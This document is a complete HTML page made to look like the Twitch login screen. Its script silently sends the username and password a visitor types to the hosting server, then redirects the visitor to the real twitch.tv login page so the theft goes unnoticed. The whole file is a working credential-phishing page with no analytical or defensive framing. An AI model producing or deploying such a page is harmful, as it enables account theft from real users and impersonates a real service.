<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Twitch - Log In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,Roobert,'Helvetica Neue',Helvetica,Arial,sans-serif;background:#0e0e10}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:#18181b;padding:40px;width:400px}.logo{text-align:center;margin-bottom:30px;color:#bf94ff;font-size:40px;font-weight:700}.title{color:#efeff1;font-size:20px;font-weight:600;margin-bottom:20px}input{width:100%;padding:12px;background:#18181b;border:1px solid #464649;border-radius:4px;color:#efeff1;font-size:16px;margin-bottom:12px;outline:none}input:focus{border-color:#a970ff}input[type="submit"]{background:#9147ff;color:white;border:none;font-weight:600;cursor:pointer;border-radius:4px}input[type="submit"]:hover{background:#772ce8}.link{color:#bf94ff;text-decoration:none;font-size:14px}.link:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo">Twitch</div><div class="title">Log in to Twitch</div><form method="POST"><input type="text"name="username"placeholder="Username"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log In"></form><a href="#"class="link">Forgot your password?</a></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.twitch.tv/login';});});</script></body></html>
